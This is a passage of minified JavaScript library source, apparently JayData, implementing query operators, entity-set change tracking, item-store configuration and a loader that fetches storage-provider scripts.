q=q.take(2);var pHandler=new $data.PromiseHandler();var cbWrapper=pHandler.createCallback(onResult);var singleExpression=Container.createSingleExpression(q.expression);var preparator=Container.createQueryExpressionCreator(q.entityContext);try{var expression=preparator.Visit(singleExpression);this.entityContext.log({event:"EntityExpression",data:expression});q.entityContext.executeQuery(Container.createQueryable(q,expression),cbWrapper,transaction);}catch(e){cbWrapper.error(e);}
return pHandler.getPromise();},some:function(filterPredicate,thisArg,onResult,transaction){this._checkOperation('some');var q=this;if(filterPredicate){q=this.filter(filterPredicate,thisArg);}
q=q.take(1);var pHandler=new $data.PromiseHandler();var cbWrapper=pHandler.createCallback(onResult);var someExpression=Container.createSomeExpression(q.expression);var preparator=Container.createQueryExpressionCreator(q.entityContext);try{var expression=preparator.Visit(someExpression);this.entityContext.log({event:"EntityExpression",data:expression});q.entityContext.executeQuery(Container.createQueryable(q,expression),cbWrapper,transaction);}catch(e){cbWrapper.error(e);}
return pHandler.getPromise();},every:function(filterPredicate,thisArg,onResult,transaction){this._checkOperation('every');var q=this;if(filterPredicate){q=this.filter(filterPredicate,thisArg);}
q=q.take(1);var pHandler=new $data.PromiseHandler();var cbWrapper=pHandler.createCallback(onResult);var everyExpression=Container.createEveryExpression(q.expression);var preparator=Container.createQueryExpressionCreator(q.entityContext);try{var expression=preparator.Visit(everyExpression);this.entityContext.log({event:"EntityExpression",data:expression});q.entityContext.executeQuery(Container.createQueryable(q,expression),cbWrapper,transaction);}catch(e){cbWrapper.error(e);}
return pHandler.getPromise();},take:function(amount){this._checkOperation('take');var constExp=Container.createConstantExpression(amount,"number");var takeExp=Container.createPagingExpression(this.expression,constExp,$data.Expressions.ExpressionType.Take);return Container.createQueryable(this,takeExp);},skip:function(amount){this._checkOperation('skip');var constExp=Container.createConstantExpression(amount,"number");var takeExp=Container.createPagingExpression(this.expression,constExp,$data.Expressions.ExpressionType.Skip);return Container.createQueryable(this,takeExp);},order:function(selector){if(selector===''||selector===undefined||selector===null){return this;}
if(selector[0]==="-"){var orderString="it."+selector.replace("-","");return this.orderByDescending(orderString);}else{return this.orderBy("it."+selector);}},orderBy:function(selector,thisArg){this._checkOperation('orderBy');var codeExpression=Container.createCodeExpression(selector,thisArg);var exp=Container.createOrderExpression(this.expression,codeExpression,$data.Expressions.ExpressionType.OrderBy);var q=Container.createQueryable(this,exp);return q;},orderByDescending:function(selector,thisArg){this._checkOperation('orderByDescending');var codeExpression=Container.createCodeExpression(selector,thisArg);var exp=Container.createOrderExpression(this.expression,codeExpression,$data.Expressions.ExpressionType.OrderByDescending);var q=Container.createQueryable(this,exp);return q;},first:function(filterPredicate,thisArg,onResult,transaction){this._checkOperation('first');var q=this;if(filterPredicate){q=this.filter(filterPredicate,thisArg);}
q=q.take(1);var pHandler=new $data.PromiseHandler();var cbWrapper=pHandler.createCallback(onResult);var firstExpression=Container.createFirstExpression(q.expression);var preparator=Container.createQueryExpressionCreator(q.entityContext);try{var expression=preparator.Visit(firstExpression);q.entityContext.log({event:"EntityExpression",data:expression});q.entityContext.executeQuery(Container.createQueryable(q,expression),cbWrapper,transaction);}catch(e){cbWrapper.error(e);}
return pHandler.getPromise();},include:function(selector){this._checkOperation('include');var constExp=Container.createConstantExpression(selector,"string");var takeExp=Container.createIncludeExpression(this.expression,constExp);return Container.createQueryable(this,takeExp);},withInlineCount:function(selector){this._checkOperation('withInlineCount');var constExp=Container.createConstantExpression(selector||'allpages',"string");var inlineCountExp=Container.createInlineCountExpression(this.expression,constExp);return Container.createQueryable(this,inlineCountExp);},removeAll:function(onResult,transaction){this._checkOperation('batchDelete');var pHandler=new $data.PromiseHandler();var cbWrapper=pHandler.createCallback(onResult);var batchDeleteExpression=Container.createBatchDeleteExpression(this.expression);var preparator=Container.createQueryExpressionCreator(this.entityContext);try{var expression=preparator.Visit(batchDeleteExpression);this.entityContext.log({event:"EntityExpression",data:expression});this.entityContext.executeQuery(Container.createQueryable(this,expression),cbWrapper,transaction);}catch(e){cbWrapper.error(e);}
return pHandler.getPromise();},_runQuery:function(onResult_items,transaction){var pHandler=new $data.PromiseHandler();var cbWrapper=pHandler.createCallback(onResult_items);var preparator=Container.createQueryExpressionCreator(this.entityContext);try{var expression=preparator.Visit(this.expression);this.entityContext.log({event:"EntityExpression",data:expression});this.entityContext.executeQuery(Container.createQueryable(this,expression),cbWrapper,transaction);}catch(e){cbWrapper.error(e);}
return pHandler.getPromise();},toTraceString:function(name){var expression=this.expression;if(name){expression=Container['create'+name+'Expression'](expression);}else{expression=Container.createToArrayExpression(expression);}
var preparator=Container.createQueryExpressionCreator(this.entityContext);expression=preparator.Visit(expression);var q=Container.createQueryable(this,expression)
return q.entityContext.getTraceString(q);},_checkOperation:function(name){var operation=this.entityContext.resolveSetOperations(name);if(operation.invokable!=undefined&&!operation.invokable)
Guard.raise(new Exception("Operation '"+name+"' is not invokable with the provider"));},defaultType:{}},null);$data.EntitySchemaConfig=function EntitySchemaConfig(){this.Name="";};$data.entitySetState={created:0,defined:1,active:2};$data.Class.defineEx('$data.EntitySet',[{type:$data.Queryable,params:[new ConstructorParameter(1)]}],null,{constructor:function(elementType,context,collectionName,eventHandlers,roles){this.createNew=this[elementType.name]=this.elementType=this.defaultType=elementType;var self=this;context['createAdd'+elementType.name]=function(initData){var entity=new elementType(initData);return self.add(entity);}
this.stateManager=new $data.EntityStateManager(this);this.collectionName=collectionName;this.roles=roles;for(var i in eventHandlers){this[i]=eventHandlers[i];}},find:function(keyValue,cb){var key=this.defaultType.memberDefinitions.getKeyProperties()[0];return this.single("it."+key.name+" == this.value",{value:keyValue},cb);},addNew:function(item,cb){var callback=$data.typeSystem.createCallbackSetting(cb);var _item=new this.createNew(item);this.entityContext.saveChanges(cb);return _item;},executeQuery:function(expression,on_ready){var callBack=$data.typeSystem.createCallbackSetting(on_ready);this.entityContext.executeQuery(expression,callBack);},getTraceString:function(expression){return this.entityContext.getTraceString(expression);},setContext:function(entityContext){this.entitySetState=$data.entitySetState.active;this.entityContext=entityContext;this.entityContext[this.schema.name]=this[this.schema.name];},_trackEntity:function(entity){var trackedEntities=this.entityContext.stateManager.trackedEntities;for(var i=0;i<trackedEntities.length;i++){if(trackedEntities[i].data===entity)
return;}
trackedEntities.push({entitySet:this,data:entity});},add:function(entity){var data=entity;if(entity instanceof $data.EntityWrapper){data=entity.getEntity();}else if(!(entity instanceof this.createNew)){data=new this.createNew(entity);}
data.entityState=$data.EntityState.Added;data.changedProperties=undefined;data.context=this.entityContext;this._trackEntity(data);return data;},addMany:function(entities){var result=[];var self=this;entities.forEach(function(entity){result.push(self.add(entity));});return result;},remove:function(entity){var data=entity;if(entity instanceof $data.EntityWrapper){data=entity.getEntity();}else if(!(entity instanceof this.createNew)){data=new this.createNew(entity);}
data.entityState=$data.EntityState.Deleted;data.changedProperties=undefined;this._trackEntity(data);},attach:function(entity,keepChanges){var data=entity;if(entity instanceof $data.EntityWrapper){data=entity.getEntity();}else if(!(entity instanceof this.createNew)){data=new this.createNew(entity);}
for(var i=0;i<this.entityContext.stateManager.trackedEntities.length;i++){var current=this.entityContext.stateManager.trackedEntities[i];if(current.data===data)
break;if(current.data.equals(data)){Guard.raise(new Exception("Context already contains this entity!!!"));}}
if(!keepChanges){data.entityState=$data.EntityState.Unchanged;data.changedProperties=undefined;}
data.context=this.entityContext;this._trackEntity(data);},detach:function(entity){var data=entity;if(entity instanceof $data.EntityWrapper){data=entity.getEntity();}else if(!(entity instanceof this.createNew)){data=new this.createNew(entity);}
var existsItem;var trackedEnt=this.entityContext.stateManager.trackedEntities;for(var i=0;i<trackedEnt.length;i++){if(trackedEnt[i].data.equals(data))
existsItem=trackedEnt[i];}
if(existsItem){var idx=this.entityContext.stateManager.trackedEntities.indexOf(existsItem);entity.entityState=$data.EntityState.Detached;this.entityContext.stateManager.trackedEntities.splice(idx,1);return;}},attachOrGet:function(entity){var data=entity;if(entity instanceof $data.EntityWrapper){data=entity.getEntity();}else if(!(entity instanceof this.createNew)){data=new this.createNew(entity);}
var existsItem;var trackedEnt=this.entityContext.stateManager.trackedEntities;for(var i=0;i<trackedEnt.length;i++){if(trackedEnt[i].data.equals(data))
existsItem=trackedEnt[i];}
if(existsItem){return existsItem.data;}
data.entityState=$data.EntityState.Unchanged;data.changedProperties=undefined;data.context=this.entityContext;this._trackEntity(data);return data;},loadItemProperty:function(entity,memberDefinition,callback){return this.entityContext.loadItemProperty(entity,memberDefinition,callback);},saveChanges:function(){return this.entityContext.saveChanges.apply(this.entityContext,arguments);},addProperty:function(name,getter,setter){return this.elementType.addProperty.apply(this.elementType,arguments);},expression:{get:function(){if(!this._expression){var ec=Container.createEntityContextExpression(this.entityContext);var memberdef=this.entityContext.getType().getMemberDefinition(this.collectionName);var es=Container.createEntitySetExpression(ec,Container.createMemberInfoExpression(memberdef),null,this);this._expression=es;}
return this._expression;},set:function(value){this._expression=value;}}},null);$data.EntityState={Detached:0,Unchanged:10,Added:20,Modified:30,Deleted:40};$data.Class.define('$data.EntityStateManager',null,null,{constructor:function(entityContext){this.entityContext=null;this.trackedEntities=[];this.init(entityContext);},init:function(entityContext){this.entityContext=entityContext;},reset:function(){this.trackedEntities=[];}},null);$data.Class.define('$data.ItemStoreClass',null,null,{constructor:function(){var self=this;self.itemStoreConfig={aliases:{},contextTypes:{}}
self.resetStoreToDefault('local',true);$data.addStore=function(){return self.addItemStoreAlias.apply(self,arguments);};$data.implementation=self.implementation;$data.Entity.addMember('storeToken',{get:function(){if(this.storeConfigs&&this.storeConfigs['default'])
return this.storeConfigs.stores[this.storeConfigs['default']];},set:function(value){self._setTypeStoreConfig(this,'default',value);}},true);},itemStoreConfig:{},addItemStoreAlias:function(name,contextFactoryOrToken,isDefault){var self=this;var promise=new $data.PromiseHandler();var callback=promise.createCallback();if('string'===typeof name){if('object'===typeof contextFactoryOrToken&&'factory'in contextFactoryOrToken){var type=Container.resolveType(contextFactoryOrToken.typeName);self.itemStoreConfig.aliases[name]=contextFactoryOrToken.factory;self.itemStoreConfig.contextTypes[name]=type;if(isDefault){self.itemStoreConfig['default']=name;}
callback.success();return promise.getPromise();}
else if('function'===typeof contextFactoryOrToken){var preContext=contextFactoryOrToken();var contextPromise;if(preContext&&preContext instanceof $data.EntityContext){callback.success(preContext);contextPromise=promise.getPromise();}else{contextPromise=preContext;}
return contextPromise.then(function(ctx){if(typeof ctx==='function'){return self.addItemStoreAlias(name,ctx,isDefault);}
if(ctx instanceof $data.EntityContext){return ctx.onReady().then(function(ctx){self.itemStoreConfig.aliases[name]=contextFactoryOrToken;self.itemStoreConfig.contextTypes[name]=ctx.getType();if(isDefault){self.itemStoreConfig['default']=name;}
return ctx;});}else{promise=new $data.PromiseHandler();callback=promise.createCallback();callback.error(new Exception('factory dont have context instance','Invalid arguments'));return promise.getPromise();}});}}
callback.error(new Exception('Name or factory missing','Invalid arguments'));return promise.getPromise();},resetStoreToDefault:function(name,isDefault){this.itemStoreConfig.aliases[name]=this._getDefaultItemStoreFactory;delete this.itemStoreConfig.contextTypes[name];if(isDefault){this.itemStoreConfig['default']=name;}},_setStoreAlias:function(entity,storeToken){if('object'===typeof storeToken&&!entity.storeToken)
entity.storeToken=storeToken
return entity;},_getStoreAlias:function(entity,storeAlias){var type;if(entity instanceof $data.Entity){var alias=storeAlias||entity.storeToken;if(alias){return alias;}else{type=entity.getType();}}else{type=entity;}
return storeAlias||(type.storeConfigs?type.storeConfigs['default']:undefined)||type.storeToken;},_getStoreContext:function(aliasOrToken,type,nullIfInvalid){var contextPromise=this._getContextPromise(aliasOrToken,type);if(!contextPromise||contextPromise instanceof $data.EntityContext){var promise=new $data.PromiseHandler();var callback=promise.createCallback();callback.success(contextPromise);contextPromise=promise.getPromise();}
return contextPromise.then(function(context){if(context instanceof $data.EntityContext){return context.onReady();}else if(nullIfInvalid){return null;}else{var promise=new $data.PromiseHandler();var callback=promise.createCallback();callback.error(new Exception('factory return type error','Error'));return promise.getPromise();}});},_getContextPromise:function(aliasOrToken,type){if(aliasOrToken&&'object'===typeof aliasOrToken&&'function'===typeof aliasOrToken.factory){return aliasOrToken.factory(type);}else if(aliasOrToken&&'object'===typeof aliasOrToken&&'object'===typeof aliasOrToken.args&&'string'===typeof aliasOrToken.typeName){var type=Container.resolveType(aliasOrToken.typeName);return new type(JSON.parse(JSON.stringify(aliasOrToken.args)));}
else if(aliasOrToken&&'string'===typeof aliasOrToken&&type.storeConfigs&&type.storeConfigs.stores[aliasOrToken]&&typeof type.storeConfigs.stores[aliasOrToken].factory==='function'){return type.storeConfigs.stores[aliasOrToken].factory();}
else if(aliasOrToken&&'string'===typeof aliasOrToken&&type.storeConfigs&&type.storeConfigs.stores[aliasOrToken]){return this._getDefaultItemStoreFactory(type,type.storeConfigs.stores[aliasOrToken]);}
else if(aliasOrToken&&'string'===typeof aliasOrToken&&this.itemStoreConfig.aliases[aliasOrToken]){return this.itemStoreConfig.aliases[aliasOrToken](type);}
else if(aliasOrToken&&'function'===typeof aliasOrToken){return aliasOrToken();}
else{return this.itemStoreConfig.aliases[this.itemStoreConfig['default']](type);}},_getStoreEntitySet:function(storeAlias,instanceOrType){var aliasOrToken=this._getStoreAlias(instanceOrType,storeAlias);var type=("function"===typeof instanceOrType)?instanceOrType:instanceOrType.getType();;return this._getStoreContext(aliasOrToken,type).then(function(ctx){var entitySet=ctx.getEntitySetFromElementType(type);if(!entitySet){var d=new $data.PromiseHandler();var callback=d.createCallback();callback.error("EntitySet not exist for "+type.fullName);return d.getPromise();}
return entitySet;});},_getDefaultItemStoreFactory:function(instanceOrType,storeConfig){if(instanceOrType){var type=("function"===typeof instanceOrType)?instanceOrType:instanceOrType.getType();var typeName=$data.Container.resolveName(type)+"_items";var typeName=typeName.replace(/\./g,"_");var storeConfig=$data.typeSystem.extend({collectionName:'Items',tableName:typeName,initParam:{provider:'local',databaseName:typeName}},storeConfig);if(storeConfig.tableName&&!storeConfig.collectionName)
storeConfig.collectionName=storeConfig.tableName;var contextDef={};contextDef[storeConfig.collectionName]={type:$data.EntitySet,elementType:type}
if(storeConfig.tableName)
contextDef[storeConfig.collectionName]['tableName']=storeConfig.tableName;var inMemoryType=$data.EntityContext.extend(typeName,contextDef);return new inMemoryType(storeConfig.initParam);}
return undefined;},implementation:function(name,contextOrAlias){var self=$data.ItemStore;var result;if(typeof contextOrAlias==='string'){contextOrAlias=self.itemStoreConfig.contextTypes[contextOrAlias]}else if(contextOrAlias instanceof $data.EntityContext){contextOrAlias=contextOrAlias.getType();}else if(!(typeof contextOrAlias==='function'&&contextOrAlias.isAssignableTo)){contextOrAlias=self.itemStoreConfig.contextTypes[self.itemStoreConfig['default']];}
if(contextOrAlias){result=self._resolveFromContext(contextOrAlias,name);}
if(!result){result=Container.resolveType(name);}
return result;},_resolveFromContext:function(contextType,name){var memDefs=contextType.memberDefinitions.getPublicMappedProperties();for(var i=0;i<memDefs.length;i++){var memDef=memDefs[i];var memDefType=Container.resolveType(memDef.type);if(memDefType.isAssignableTo&&memDefType.isAssignableTo($data.EntitySet)){var elementType=Container.resolveType(memDef.elementType);if(elementType.name===name){return elementType;}}}
return null;},EntityInstanceSave:function(storeAlias,hint){var self=$data.ItemStore;var entity=this;return self._getStoreEntitySet(storeAlias,entity).then(function(entitySet){return self._getSaveMode(entity,entitySet,hint,storeAlias).then(function(mode){mode=mode||'add';switch(mode){case'add':entitySet.add(entity);break;case'attach':entitySet.attach(entity,true);entity.entityState=$data.EntityState.Modified;break;default:var d=new $data.PromiseHandler();var callback=d.createCallback();callback.error('save mode not supported: '+mode);return d.getPromise();}
return entitySet.entityContext.saveChanges().then(function(){self._setStoreAlias(entity,entitySet.entityContext.storeToken);return entity;});});});},EntityInstanceRemove:function(storeAlias){var self=$data.ItemStore;var entity=this;return self._getStoreEntitySet(storeAlias,entity).then(function(entitySet){entitySet.remove(entity);return entitySet.entityContext.saveChanges().then(function(){return entity;});});},EntityInstanceRefresh:function(storeAlias,keepStore){var self=$data.ItemStore;var entity=this;var entityType=entity.getType();var key=self._getKeyObjectFromEntity(entity,entityType);return entityType.read(key,storeAlias).then(function(loadedEntity){entityType.memberDefinitions.getPublicMappedProperties().forEach(function(memDef){entity[memDef.name]=loadedEntity[memDef.name];});entity.storeToken=(keepStore?entity.storeToken:undefined)||loadedEntity.storeToken;entity.changedProperties=undefined;return entity;});},EntityInheritedTypeProcessor:function(type){var self=$data.ItemStore;type.readAll=self.EntityTypeReadAll(type);type.read=self.EntityTypeRead(type);type.removeAll=self.EntityTypeRemoveAll(type);type.remove=self.EntityTypeRemove(type);type.get=self.EntityTypeGet(type);type.save=self.EntityTypeSave(type);type.addMany=self.EntityTypeAddMany(type);type.itemCount=self.EntityTypeItemCount(type);type.query=self.EntityTypeQuery(type);type.takeFirst=self.EntityTypeTakeFirst(type);type.setStore=self.EntityTypeSetStore(type);},EntityTypeReadAll:function(type){return function(storeAlias){var self=$data.ItemStore;return self._getStoreEntitySet(storeAlias,type).then(function(entitySet){return entitySet.forEach(function(item){self._setStoreAlias(item,entitySet.entityContext.storeToken);});});}},EntityTypeRemoveAll:function(type){return function(storeAlias){var self=$data.ItemStore;return self._getStoreEntitySet(storeAlias,type).then(function(entitySet){return entitySet.toArray().then(function(items){items.forEach(function(item){entitySet.remove(item);});return entitySet.entityContext.saveChanges().then(function(){return items;});});});}},EntityTypeRead:function(type){return function(key,storeAlias){var self=$data.ItemStore;return self._getStoreEntitySet(storeAlias,type).then(function(entitySet){try{var singleParam=self._findByIdQueryable(entitySet,key);return entitySet.single(singleParam.predicate,singleParam.thisArgs).then(function(item){return self._setStoreAlias(item,entitySet.entityContext.storeToken);});}catch(e){var d=new $data.PromiseHandler();var callback=d.createCallback();callback.error(e);return d.getPromise();}});};},EntityTypeGet:function(type){return function(key,storeAlias){var self=$data.ItemStore;var item=new type(self._getKeyObjectFromEntity(key));item.refresh(storeAlias);return item;};},EntityTypeSave:function(type){return function(initData,storeAlias,hint){var self=$data.ItemStore;var instance=new type(initData);return instance.save(storeAlias,hint);}},EntityTypeAddMany:function(type){return function(initDatas,storeAlias){var self=$data.ItemStore;return self._getStoreEntitySet(storeAlias,type).then(function(entitySet){var items=entitySet.addMany(initDatas);return entitySet.entityContext.saveChanges().then(function(){return items;});});}},EntityTypeRemove:function(type){return function(key,storeAlias){var self=$data.ItemStore;var entityPk=type.memberDefinitions.getKeyProperties();var entity;if(entityPk.length===1){var obj={};obj[entityPk[0].name]=key;entity=new type(obj);}else{entity=new type(key);}
return entity.remove(storeAlias);}},EntityTypeItemCount:function(type){return function(storeAlias){var self=$data.ItemStore;return self._getStoreEntitySet(storeAlias,type).then(function(entitySet){return entitySet.length();});}},EntityTypeQuery:function(type){return function(predicate,thisArg,storeAlias){var self=$data.ItemStore;return self._getStoreEntitySet(storeAlias,type).then(function(entitySet){return entitySet.filter(predicate,thisArg).forEach(function(item){self._setStoreAlias(item,entitySet.entityContext.storeToken);});});}},EntityTypeTakeFirst:function(type){return function(predicate,thisArg,storeAlias){var self=$data.ItemStore;return self._getStoreEntitySet(storeAlias,type).then(function(entitySet){return entitySet.first(predicate,thisArg).then(function(item){return self._setStoreAlias(item,entitySet.entityContext.storeToken);});});}},EntityTypeSetStore:function(type){return function(name,config){if(typeof name==='object'&&typeof config==='undefined'){config=name;name='default';}
var self=$data.ItemStore;var defStoreConfig={};if(config){if(config.tableName){defStoreConfig.tableName=config.tableName;delete config.tableName;}
if(config.collectionName){defStoreConfig.collectionName=config.collectionName;delete config.collectionName;}
if(typeof config.dataSource==='string'){var ds=config.dataSource;if(ds.lastIndexOf('/')===ds.length-1){ds=ds.substring(0,ds.lastIndexOf('/'));}
var parsedApiUrl=ds.substring(0,ds.lastIndexOf('/'));if(!defStoreConfig.tableName)
defStoreConfig.tableName=ds.substring(ds.lastIndexOf('/')+1);var provider=config.provider||config.name;switch(provider){case'oData':config.oDataServiceHost=config.oDataServiceHost||parsedApiUrl;break;case'webApi':config.apiUrl=config.apiUrl||parsedApiUrl;break;default:break;}}}else{config={name:'local'};}
defStoreConfig.initParam=config;self._setTypeStoreConfig(type,name,defStoreConfig);return type;}},_setTypeStoreConfig:function(type,name,config){if(!type.storeConfigs){type.storeConfigs={stores:{}};}
type.storeConfigs.stores[name]=config;if(name==='default'){type.storeConfigs['default']=name;}},_findByIdQueryable:function(set,keys){var keysProps=set.defaultType.memberDefinitions.getKeyProperties();if(keysProps.length>1&&keys&&'object'===typeof keys){var predicate="",thisArgs={};for(var i=0;i<keysProps.length;i++){if(i>0)predicate+=" && ";var key=keysProps[i];predicate+="it."+key.name+" == this."+key.name;thisArgs[key.name]=keys[key.name];}
return{predicate:predicate,thisArgs:thisArgs};}else if(keysProps.length===1){return{predicate:"it."+keysProps[0].name+" == this.value",thisArgs:{value:keys}};}else{throw'invalid keys';}},_getKeyObjectFromEntity:function(obj,entityType){var key;var keyDefs=entityType.memberDefinitions.getKeyProperties();if(keyDefs.length===1)
key=obj&&typeof obj==='object'?obj[keyDefs[0].name]:obj;else{key={};for(var i=0;i<keyDefs.length;i++){key[keyDefs[0].name]=obj?obj[keyDefs[0].name]:obj;}}
return key;},_getSaveMode:function(entity,entitySet,hint,storeAlias){var self=this;var promise=new $data.PromiseHandler();var callback=promise.createCallback();var entityType=entity.getType();switch(true){case hint==='update':callback.success('attach');break;case hint==='new':callback.success('add');break;case false===entityType.memberDefinitions.getKeyProperties().every(function(keyDef){return entity[keyDef.name];}):callback.success('add');break;case!!entity.storeToken:callback.success('attach');break;break;default:storeAlias=this._getStoreAlias(entity,storeAlias);entityType.read(self._getKeyObjectFromEntity(entity,entityType),storeAlias).then(function(){callback.success('attach');}).fail(function(){callback.success('add');});break;}
return promise.getPromise();},ContextRegister:function(storageProviderCfg){var self=this;var args=JSON.parse(JSON.stringify(storageProviderCfg));this.storeToken={typeName:this.getType().fullName,args:args,factory:function(){return new(self.getType())(args);}}
var members=this.getType().memberDefinitions.getPublicMappedProperties();for(var i=0;i<members.length;i++){var item=members[i];if(item.type){var itemResolvedDataType=Container.resolveType(item.type);if(itemResolvedDataType&&itemResolvedDataType.isAssignableTo&&itemResolvedDataType.isAssignableTo($data.EntitySet)){var elementType=Container.resolveType(item.elementType);if(!elementType.storeToken){elementType.storeToken=elementType.storeToken||this.storeToken;}}}}},QueryResultModifier:function(query){var self=$data.ItemStore;var context=query.context;var type=query.modelBinderConfig.$type;if('string'===typeof type){type=Container.resolveType(type);}
if(type===$data.Array&&query.modelBinderConfig.$item&&query.modelBinderConfig.$item.$type){type=query.modelBinderConfig.$item.$type;}
if((type&&type.isAssignableTo&&type.isAssignableTo($data.Entity))||(typeof type==='undefined'&&query.result&&query.result[0]instanceof $data.Entity)){for(var i=0;i<query.result.length;i++){self._setStoreAlias(query.result[i],context.storeToken)}}}});$data.ItemStore=new $data.ItemStoreClass();$data.Entity.addMember('field',function(propName){var def=this.memberDefinitions.getMember(propName);if(def){if(def.definedBy===this){return new $data.MemberWrapper(def);}else{Guard.raise(new Exception("Member '"+propName+"' defined on '"+def.definedBy.fullName+"'!",'Invalid Operation'));}}else{Guard.raise(new Exception("Member '"+propName+"' not exists!",'Invalid Operation'));}
return this;},true);$data.Class.define('$data.MemberWrapper',null,null,{constructor:function(memberDefinition){this.memberDefinition=memberDefinition;},setKey:function(value){this.memberDefinition.key=value||true;return this;},setComputed:function(value){this.memberDefinition.computed=value||true;return this;},setRequired:function(value){this.memberDefinition.required=value||true;return this;},setNullable:function(value){this.memberDefinition.nullable=value||true;return this;},changeDefinition:function(attr,value){this.memberDefinition[attr]=value;return this;}});Exception=function(message,name,data){Error.call(this);if(Error.captureStackTrace)
Error.captureStackTrace(this,this.constructor);this.name=name||"Exception";this.message=message;this.data=data;}
Exception.prototype.__proto__=Error.prototype;Exception.prototype._getStackTrace=function(){var callstack=[];var isCallstackPopulated=false;};$data.Class.define('$data.StorageProviderLoaderBase',null,null,{isSupported:function(providerName){$data.Trace.log('Detecting '+providerName+' provider support');var supported=true;switch(providerName){case'indexedDb':supported=window.indexedDB||window.webkitIndexedDB||window.mozIndexedDB||(window.msIndexedDB&&!(/^file:/.test(window.location.href)));break;case'storm':supported='XMLHttpRequest'in window;break;case'webSql':case'sqLite':supported='openDatabase'in window;break;case'LocalStore':supported='localStorage'in window&&window.localStorage?true:false;break;case'sqLite':supported='openDatabase'in window;break;case'mongoDB':supported=$data.mongoDBDriver;break;default:break;}
$data.Trace.log(providerName+' provider is '+(supported?'':'not')+' supported');return supported;},scriptLoadTimeout:{type:'int',value:1000},scriptLoadInterval:{type:'int',value:50},npmModules:{value:{'indexedDb':'jaydata-indexeddb','InMemory':'jaydata-inmemory','LocalStore':'jaydata-inmemory','mongoDB':'jaydata-mongodb','oData':'jaydata-odata','webApi':'jaydata-webapi','sqLite':'jaydata-sqlite','webSql':'jaydata-sqlite','storm':'jaydata-storm'}},ProviderNames:{value:{'indexedDb':'IndexedDb','InMemory':'InMemory','LocalStore':'InMemory','oData':'oData','webApi':'WebApi','sqLite':'SqLite','webSql':'SqLite','storm':'Storm'}},load:function(providerList,callback){$data.Trace.log('Loading provider(s): '+providerList);callback=$data.typeSystem.createCallbackSetting(callback);var currentProvider=providerList.shift();while(currentProvider&&!this.isSupported(currentProvider)){currentProvider=providerList.shift();}
$data.Trace.log('First supported provider is '+currentProvider);if(!currentProvider){$data.Trace.log('Provider fallback failed');callback.error();}
if($data.RegisteredStorageProviders){$data.Trace.log('Is the '+currentProvider+' provider already registered?');var provider=$data.RegisteredStorageProviders[currentProvider];if(provider){$data.Trace.log(currentProvider+' provider registered');callback.success(provider)
return;}else{$data.Trace.log(currentProvider+' provider not registered');}}
if(typeof module!=='undefined'&&typeof module.exports!=='undefined'){$data.Trace.log('node.js detected trying to load NPM module');this.loadNpmModule(currentProvider,providerList,callback);}else{$data.Trace.log('Browser detected trying to load provider');this.loadProvider(currentProvider,providerList,callback);}},loadProvider:function(currentProvider,providerList,callback){var self=this;var mappedName=$data.StorageProviderLoader.ProviderNames[currentProvider]||currentProvider;$data.Trace.log(currentProvider+' provider is mapped to name '+mappedName+'Provider');if(mappedName){var url=this.getUrl(mappedName);$data.Trace.log(currentProvider+' provider from URL: '+url);var loader=this.loadScript;if(document&&document.createElement){$data.Trace.log('document and document.createElement detected, using script element loader method');loader=this.loadScriptElement;}
loader.call(this,url,currentProvider,function(successful){var provider=$data.RegisteredStorageProviders[currentProvider];if(successful&&provider){$data.Trace.log(currentProvider+' provider successfully registered');callback.success(provider);}else if(providerList.length>0){$data.Trace.log(currentProvider+' provider failed to load, trying to fallback to '+providerList+' provider(s)');self.load(providerList,callback);}else{$data.Trace.log(currentProvider+' provider failed to load');callback.error();}});}},getUrl:function(providerName){var jaydataScriptMin=document.querySelector('script[src$="jaydata.min.js"]');var jaydataScript=document.querySelector('script[src$="jaydata.js"]');if(jaydataScriptMin)return jaydataScriptMin.src.substring(0,jaydataScriptMin.src.lastIndexOf('/')+1)+'jaydataproviders/'+providerName+'Provider.min.js';else if(jaydataScript)return jaydataScript.src.substring(0,jaydataScript.src.lastIndexOf('/')+1)+'jaydataproviders/'+providerName+'Provider.js';else return'jaydataproviders/'+providerName+'Provider.js';},loadScript:function(url,currentProvider,callback){if(!url){callback(false);return;}
function getHttpRequest(){if(window.XMLHttpRequest)
return new XMLHttpRequest();else if(window.ActiveXObject)
return new ActiveXObject("MsXml2.XmlHttp");else{$data.Trace.log('XMLHttpRequest or MsXml2.XmlHttp ActiveXObject not found');callback(false);return;}}
var oXmlHttp=getHttpRequest();oXmlHttp.onreadystatechange=function(){$data.Trace.log('HTTP request is in state: '+oXmlHttp.readyState);if(oXmlHttp.readyState==4){if(oXmlHttp.status==200||oXmlHttp.status==304){$data.Trace.log('HTTP request succeeded');$data.Trace.log('HTTP request response text: '+oXmlHttp.responseText);eval.call(window,oXmlHttp.responseText);if(typeof callback==='function')
callback(true);else $data.Trace.log('Callback function is undefined');}else{$data.Trace.log('HTTP request status: ',oXmlHttp.status);if(typeof callback==='function')
callback(false);else $data.Trace.log('Callback function is undefined');}}};oXmlHttp.open('GET',url,true);oXmlHttp.send(null);},loadScriptElement:function(url,currentProvider,callback){var head=document.getElementsByTagName('head')[0]||document.documentElement;var script=document.createElement('script');script.type='text/javascript';script.src=url;$data.Trace.log('Appending child '+script+' to '+head);head.appendChild(script);var loadInterval=this.scriptLoadInterval||50;var iteration=Math.ceil(this.scriptLoadTimeout/loadInterval);$data.Trace.log('Script element watcher iterating '+iteration+' times');function watcher(){$data.Trace.log('Script element watcher iteration '+iteration);var provider=$data.RegisteredStorageProviders[currentProvider];if(provider){$data.Trace.log(currentProvider+' provider registered');callback(true);}else{iteration--;if(iteration>0){$data.Trace.log('Script element watcher next iteration');setTimeout(watcher,loadInterval);}else{$data.Trace.log('Script element loader failed');callback(false);}}}
setTimeout(watcher,loadInterval);},loadNpmModule:function(currentProvider,providerList,callback){var provider=null;try{require(this.npmModules[currentProvider]);provider=$data.RegisteredStorageProviders[currentProvider];$data.Trace.log('NPM module loader successfully registered '+currentProvider+' provider');}catch(e){$data.Trace.log('NPM module loader failed for '+currentProvider+' provider');}
if(provider){callback.success(provider);}else if(providerList.length>0){this.load(providerList,callback);}else{callback.error();}}});$data.StorageProviderLoader=new $data.StorageProviderLoaderBase();$data.storageProviders={DbCreationType:{Merge:10,DropTableIfChanged:20,DropTableIfChange:20,DropAllExistingTables:30,ErrorIfChange:40,DropDbIfChange:50}}
